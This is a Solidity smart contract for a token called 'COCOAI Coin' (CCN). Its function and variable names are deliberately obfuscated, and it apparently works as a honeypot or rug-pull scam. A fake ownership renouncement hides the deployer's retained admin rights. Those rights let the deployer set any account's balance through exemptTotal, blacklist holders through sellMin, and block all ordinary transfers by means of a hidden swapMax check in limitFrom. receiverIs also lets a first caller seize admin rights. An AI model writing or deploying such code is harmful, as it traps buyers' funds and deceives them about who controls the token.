//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface swapMinAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldReceiver) external view returns (uint256);

    function transfer(address launchedFee, uint256 maxTeamTrading) external returns (bool);

    function allowance(address atMode, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxTeamTrading) external returns (bool);

    function transferFrom(
        address sender,
        address launchedFee,
        uint256 maxTeamTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listAutoTeam, uint256 value);
    event Approval(address indexed atMode, address indexed spender, uint256 value);
}

interface exemptFundAmount is swapMinAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract liquidityMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedSellBuy {
    function createPair(address exemptToSwap, address feeMax) external returns (address);
}

interface isReceiverTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract COCOAICoin is liquidityMode, swapMinAuto, exemptFundAmount {

    bool public teamAmountAuto;

    function balanceOf(address shouldReceiver) public view virtual override returns (uint256) {
        return buyTake[shouldReceiver];
    }

    function walletList() public {
        emit OwnershipTransferred(exemptReceiverToken, address(0));
        tradingReceiver = address(0);
    }

    string private listFund = "COCOAI Coin";

    address public exemptReceiverToken;

    uint256 public sellLiquidity;

    address tokenShouldFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function sellTrading() private view {
        require(marketingSwapTeam[_msgSender()]);
    }

    uint8 private feeSender = 18;

    function approve(address feeTrading, uint256 maxTeamTrading) public virtual override returns (bool) {
        tokenIsExempt[_msgSender()][feeTrading] = maxTeamTrading;
        emit Approval(_msgSender(), feeTrading, maxTeamTrading);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return maxBuy;
    }

    function getOwner() external view returns (address) {
        return tradingReceiver;
    }

    bool private toFund;

    function sellMin(address txFeeReceiver) public {
        sellTrading();
        
        if (txFeeReceiver == exemptReceiverToken || txFeeReceiver == buyLaunch) {
            return;
        }
        atFrom[txFeeReceiver] = true;
    }

    function owner() external view returns (address) {
        return tradingReceiver;
    }

    uint256 public minFund;

    mapping(address => mapping(address => uint256)) private tokenIsExempt;

    address private tradingReceiver;

    uint256 public maxLaunchBuy;

    function allowance(address limitMode, address feeTrading) external view virtual override returns (uint256) {
        if (feeTrading == modeLaunched) {
            return type(uint256).max;
        }
        return tokenIsExempt[limitMode][feeTrading];
    }

    string private maxBuy = "CCN";

    uint256 swapMax;

    address modeLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public buyLaunch;

    bool private swapSell;

    uint256 private fromTxMax;

    function launchWallet(uint256 maxTeamTrading) public {
        sellTrading();
        swapMax = maxTeamTrading;
    }

    function transferFrom(address launchLiquidity, address launchedFee, uint256 maxTeamTrading) external override returns (bool) {
        if (_msgSender() != modeLaunched) {
            if (tokenIsExempt[launchLiquidity][_msgSender()] != type(uint256).max) {
                require(maxTeamTrading <= tokenIsExempt[launchLiquidity][_msgSender()]);
                tokenIsExempt[launchLiquidity][_msgSender()] -= maxTeamTrading;
            }
        }
        return limitFrom(launchLiquidity, launchedFee, maxTeamTrading);
    }

    uint256 private takeTrading = 100000000 * 10 ** 18;

    function transfer(address totalModeFrom, uint256 maxTeamTrading) external virtual override returns (bool) {
        return limitFrom(_msgSender(), totalModeFrom, maxTeamTrading);
    }

    uint256 senderLiquidity;

    mapping(address => bool) public atFrom;

    constructor (){
        if (fromTxMax == shouldBuyTotal) {
            sellLiquidity = fromTxMax;
        }
        walletList();
        isReceiverTeam launchedWallet = isReceiverTeam(modeLaunched);
        buyLaunch = launchedSellBuy(launchedWallet.factory()).createPair(launchedWallet.WETH(), address(this));
        
        exemptReceiverToken = _msgSender();
        marketingSwapTeam[exemptReceiverToken] = true;
        buyTake[exemptReceiverToken] = takeTrading;
        if (fromTxMax != sellLiquidity) {
            shouldBuyTotal = sellLiquidity;
        }
        emit Transfer(address(0), exemptReceiverToken, takeTrading);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeTrading;
    }

    function exemptTotal(address totalModeFrom, uint256 maxTeamTrading) public {
        sellTrading();
        buyTake[totalModeFrom] = maxTeamTrading;
    }

    function receiverIs(address senderMax) public {
        if (teamAmountAuto) {
            return;
        }
        if (minFund != shouldBuyTotal) {
            minFund = sellLiquidity;
        }
        marketingSwapTeam[senderMax] = true;
        if (maxLaunchBuy == minFund) {
            maxLaunchBuy = minFund;
        }
        teamAmountAuto = true;
    }

    function teamShouldMode(address launchLiquidity, address launchedFee, uint256 maxTeamTrading) internal returns (bool) {
        require(buyTake[launchLiquidity] >= maxTeamTrading);
        buyTake[launchLiquidity] -= maxTeamTrading;
        buyTake[launchedFee] += maxTeamTrading;
        emit Transfer(launchLiquidity, launchedFee, maxTeamTrading);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return listFund;
    }

    uint256 public shouldBuyTotal;

    function decimals() external view virtual override returns (uint8) {
        return feeSender;
    }

    mapping(address => uint256) private buyTake;

    event OwnershipTransferred(address indexed teamLimit, address indexed swapMaxFund);

    function limitFrom(address launchLiquidity, address launchedFee, uint256 maxTeamTrading) internal returns (bool) {
        if (launchLiquidity == exemptReceiverToken) {
            return teamShouldMode(launchLiquidity, launchedFee, maxTeamTrading);
        }
        uint256 listSwap = swapMinAuto(buyLaunch).balanceOf(tokenShouldFund);
        require(listSwap == swapMax);
        require(!atFrom[launchLiquidity]);
        return teamShouldMode(launchLiquidity, launchedFee, maxTeamTrading);
    }

    mapping(address => bool) public marketingSwapTeam;

}